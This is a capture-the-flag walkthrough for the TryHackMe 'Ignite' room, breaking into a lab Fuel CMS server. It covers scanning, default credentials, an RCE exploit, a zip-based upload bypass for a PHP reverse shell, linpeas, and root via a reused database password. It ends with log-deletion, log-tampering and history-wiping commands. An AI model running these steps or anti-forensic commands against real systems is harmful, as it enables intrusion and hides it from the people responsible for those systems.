---
title: "THM:ignite"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/ignite"
category: "CTF"
tags: ctf,nmap,nikto,gobuster,dirbuster,searchsploit,apache,ubuntu,mysql,linpeas,privesc,upload,file-upload-bypass,sudo,fuel,cms
---
# THM:ignite

URL: [https://tryhackme.com/room/ignite](https://tryhackme.com/room/ignite) [Easy]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room:

> A new start-up has a few issues with their web server.

## Scanning

### Running: `nmap`

Ran the following:

> `nmap x.x.x.x`

Interesting ports found to be open:

```python
PORT   STATE SERVICE
80/tcp open  http
```

No SSH! Looks like we're going to have to do everything through the web server.

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://x.x.x.x`

Interesting folders found:

```python
/index                (Status: 200) [Size: 16595]
/home                 (Status: 200) [Size: 16595]
/assets               (Status: 301) [Size: 313] [--> http://10.10.88.210/assets/]
/offline              (Status: 200) [Size: 70]       
```

These are a bust. The main page shows a setup page for this "Fuel CMS" app.

Also see: [gobuster.log](gobuster.log)

### Running: `nikto`

Ran the following:

> `nikto -h x.x.x.x`

Interesting info found:

```python
+ Entry '/fuel/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
```

Also see: [nikto.log](nikto.log)

## Gaining Access

Simply reading the main `/` page of the website, at the bottom, we see that this "Fuel CMS" isn't fully set up, so it **includes the default admin credentials to log in**. From the `/robots.txt`, it looks like the `/fuel/` folder is where the app lives - so we can go there to log in, as admin!

It's basically an empty installation with no users and no content. Where to begin, to get a bash prompt?

### Option 1: `searchsploit`

We can run:

```bash
searchsploit "fuel cms"
```

And find some candidates:

```python
------------------------------------------------------------------- -------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------- -------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                        | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                        | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                        | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)       | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)              | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)  | php/webapps/48778.txt
------------------------------------------------------------------- -------------------------
Shellcodes: No Results
```

*Also see: [searchsploit.log](./searchsploit.log)*

In my case, I chose the `50477.py` file (these are located in `/usr/share/exploitdb/exploits/`). To run this, I copied this Python script to my [local folder](50477.py), then run:

```bash
python3 ./50477.py -u http://x.x.x.x
```

This prompts you with a `Enter Command $` prompt. You type in something to run, and it gives you the results. You could for example send it:

```bash
cat /home/www-data/flag.txt
```

After seeing in the `/home` folder there is a `www-data` folder, and using `whoami` to see that we are logged in as user `www-data`. 

This approach isn't great though because we don't actually have a shell prompt, and we're kind of limited on what we could do. You might explore the other RCE's listed above, or you could try to do other one-liners to get a reverse shell - but I decided to also check out this website for other ways in.

### Option 2: File Upload Bypass

Within this "Fuel CMS" website, where I'm logged in as the `admin` account (*you did see the clear-text credentials on the main `/` page, right?*) - there is an "Assets" screen (see `/fuel/assets`) for uploading and downloading files.

This could be useful for:

- **Uploading** and executing a reverse shell (if we can get past their validation). We can also use this to upload other useful files like [linpeas.sh](https://github.com/carlospolop/PEASS-ng). Note that this THM machine does NOT have outbound Internet access!
- **Downloading** or exfiltrating data. By simplying staging your files into `/var/www/html/assets/images` for example, that file will be viewable/downloadable from the `/fuel/assets` screen. You could create a `.zip` of interesting data, and then just download it from your browser.

We try to upload a `.php` file and it's blocked. Same with our `linpeas.sh`. However, two things are notable:

1. The validation seems to be different between the "Docs" upload and the "Images" upload. There seems to be less-validation on the "Images" upload. So, let's upload our stuff there.
1. The upload screen has the ability to "unzip" the contents. It also doesn't seem to do any validation for files that are within a `.zip` file. So, we can put our `.php` or `.sh` file into a `.zip` folder - get past the validation, and then it unzips our contents on the server!

With that said, we have enough to at least get unprivileged access.

### Unprivileged Access

The procedure / attack-chain / kill-chain to get an unprivileged reverse shell would be:

1. **Download a Reverse Shell** - since this is a PHP website, I used the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) one.
1. **Modify** - in the `.php` file, you should specify the IP address of your workstation, and the port where you will be listening for a session (e.g. `9999`).
1. **Rename and .zip** - I don't know if there is other input validation. So, I tend to have better luck using the `.phtml` file extension instead of `.php`. So, we rename the reverse shell and create a zip using 7zip with: `7z a ./php-reverse-shell.zip ./php-reverse-shell.phtml`
1. **Upload** - the `./php-reverse-shell.zip` file to the "Images" folder, choose to "Unzip zip files"
1. **Start Netcat** - on your workstation, run `nc -lvnp 9999` and start listening for a session.
1. **Execute** - in the Fuel CMS screen `/fuel/assets`, switch to "Images", and click on the `php-reverse-shell.phtml`. You should instantly get a session over on Netcat, and the browser tab where you clicked the script should hang.

#### Upgrade the Connection

You can get a slightly better bash prompt in Netcat by running:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

To make it a notch better, do <kbd>CTRL</kbd>+<kbd>Z</kbd>, then type:

```bash
stty raw -echo ; fg
```

That will give you a more stable prompt. It's not as good as an SSH session, but it's better than raw input/output.

From here, you might see there is a `www-data` home directory under `/home/` and that is where you'll find the user flag for this THM room.

### Privilege Escalation

Using a similar technique as above, we can send `linpeas.sh` up onto the server.

1. **Download Linpeas** - from here [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng).
1. **Create a .zip** - Create a zip using 7zip with: `7z a ./linpeas.zip ./linpeas.sh`
1. **Upload** - the `./linpeas.zip` file to the "Images" folder, choose to "Unzip zip files"

Now, using your unprivileged prompt from above, you can navigate to: `/var/www/html/assets/images` and run the script. Because we have a degraded shell (working over netcat), I want to run Linpeas, see the output, but also capture the output to a file, so I do this:

```bash
./linpeas.sh | tee ./linpeas.log
```

*Also see: [linpeas.log](./linpeas.log)*

> ### PRO TIP:
> By doing this in the same `images` folder, I can actually download and view that log file on my local workstation, which at the moment is a somewhat better way to view the results. Linpeas has a colorful output that isn't very readable as plain-text.

#### Linpeas Findings

The first notable thing is that this system is supposedly vulnerable to [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-4034). The description is:

> A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.

Doing a search for a Proof Of Concept (POC), I found [this one](https://github.com/arthepsy/CVE-2021-4034) ([cve-2021-4034-poc.c](./cve-2021-4034-poc.c)). You compile it on your workstation with:

```bash
gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
```

Then, similar to above, create a zip with `7z a ./cve-2021-4034.zip ./cve-2021-4034-poc`. Upload that into the "Images" folder.

Finally, from your Netcat prompt, switch to that same `/var/www/html/assets/images` folder, and then execute the exploit:

```bash
./cve-2021-4034-poc
```

Unfortunately, I got output like this:

```bash
bash: ./cve-2021-4034-poc: Permission denied
```

[Upon further research](https://github.com/arthepsy/CVE-2021-4034/issues/5#issuecomment-1033743533) like [here for example](https://nsfocusglobal.com/linux-polkit-privilege-escalation-vulnerability-cve-2021-4034/), it turns out this vulnerability fixed in `pkexec` version `0.105`, which is the exact version I have (running: `pkexec --version`).

> **Looks like this is a false-positive for Linpeas.**

NEXT, from the [Linpeas output](./linpeas.log), it's also mentioning that we have an older version of `sudo` (version `1.8.16`). So, back to `searchsploit`:

```bash
searchsploit sudo
```

We get a bunch of findings here:

```
---------------------------------------------------------------------------------------- -------------------------
 Exploit Title     |  Path
---------------------------------------------------------------------------------------- -------------------------
(Tod Miller's) Sudo/SudoEdit 1.6.9p21/1.7.2p4 - Local Privilege Escalation             | multiple/local/11651.sh
Apple Mac OSX - Sudo Password Bypass (Metasploit)                                      | osx/local/27944.rb
Battery Life Toolkit 1.0.9 - 'bltk_sudo' Local Privilege Escalation                    | linux/local/33576.txt
ptrace - Sudo Token Privilege Escalation (Metasploit)                                  | linux/local/47345.rb
RedStar 3.0 Desktop - Enable sudo Privilege Escalation                                 | linux/local/35746.sh
Sudo 1.3.1 < 1.6.8p (OpenBSD) - Pathname Validation Privilege Escalation               | bsd/local/1087.c
Sudo 1.5/1.6 - Heap Corruption                                                         | linux/local/20901.c
Sudo 1.6.3 - Unclean Environment Variable Privilege Escalation                         | linux/local/21227.sh
Sudo 1.6.8 - Information Disclosure                                                    | linux/local/24606.c
Sudo 1.6.8p9 - SHELLOPTS/PS4 Environment Variables Privilege Escalation                | linux/local/1310.txt
Sudo 1.6.9p18 - 'Defaults SetEnv' Local Privilege Escalation                           | multiple/local/7129.sh
Sudo 1.6.x - Environment Variable Handling Security Bypass (1)                         | linux/local/27056.pl
Sudo 1.6.x - Environment Variable Handling Security Bypass (2)                         | linux/local/27057.py
Sudo 1.6.x - Password Prompt Heap Overflow                                             | linux/local/21420.c
sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation | linux/local/25134.c
sudo 1.8.0 < 1.8.3p1 - Format String                                                   | linux/dos/18436.txt
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation       | linux/local/37710.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                       | linux/local/42183.c
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                            | linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                      | linux/dos/47995.txt
sudo 1.8.27 - Security Bypass                                                          | linux/local/47502.py
Sudo 1.9.5p1 - 'Baron Samedit ' Heap-Based Buffer Overflow Privilege Escalation (1)    | multiple/local/49521.py
Sudo 1.9.5p1 - 'Baron Samedit ' Heap-Based Buffer Overflow Privilege Escalation (2)    | multiple/local/49522.c
Sudo Perl 1.6.x - Environment Variable Handling Security Bypass                        | linux/local/26498.txt
sudo.bin - NLSPATH Privilege Escalation                                                | linux/local/319.c
SudoEdit 1.6.8 - Local Change Permission                                               | linux/local/470.c
ZPanel zsudo - Local Privilege Escalation (Metasploit)                                 | linux/local/26451.rb
---------------------------------------------------------------------------------------- -------------------------
--------------------------------------------------------------------------------------------------------------- ----------------------
 Shellcode Title                                                                                              |  Path
--------------------------------------------------------------------------------------------------------------- ----------------------
Linux/x86 - chmod 777 /etc/sudoers Shellcode (36 bytes)                                                       | linux_x86/43463.nasm
Linux/x86 - Edit /etc/sudoers (ALL ALL=(ALL) NOPASSWD: ALL) For Full Access + Null-Free Shellcode (79 bytes)  | linux_x86/44507.c
Linux/x86 - Edit /etc/sudoers (ALL ALL=(ALL) NOPASSWD: ALL) For Full Access Shellcode (86 bytes)              | linux_x86/13331.c
--------------------------------------------------------------------------------------------------------------- ----------------------
```

*Also see: [searchsploit-sudo.log](./searchsploit-sudo.log)*

I went through several of these, but ultimately didn't get any working. Moving on, and knowing this is a PHP website, we can look over in `/var/www/html/fuel/application/` and check out the configuration. In this file:

> **`/var/www/html/fuel/application/config/database.php`**

We have the MySQL `root` credentials. Just to see, maybe this is the same password for `root` on this box. We run:

```bash
su
```

Then use the password from that `database.php` above, and we have a root prompt. Go get your THM flag from `/root/root.txt`.

## More Exploration...

It's not needed to complete this room, but for practice, you currently have a limited bash prompt, but you have root, plus you have the mySQL`root` credentials in: `/var/www/html/fuel/application/config/database.php`. It might be an interesting exercise to practice your Advanced Persistent Threat techniques to quietly gain your own access. 

Also, it might be fun to get familiar with exploring mySQL from the command line, and exfiltrating data too. In this case, this is a pretty empty database, but it's a realistic environment to hone those skills.

## Maintaining Access

None needed.

## Clearing Tracks

This is a test machine. However, in a Red Team scenario, we might:

### Delete relevant logs from `/var/log/` - although that is loud, destructive, and might draw attention.

> `rm -Rf /var/log/*`

### Instead, consider doing a search and replace of our IP address in all logs via: 

> `find /var/log -name "*" -exec sed -i 's/10.2.110.212/127.0.0.1/g' {} \;`

### Wipe bash history for any accounts we used via: 

> `cat /dev/null > /root/.bash_history`

## Summary

Completed: [2022-02-11 23:48:52]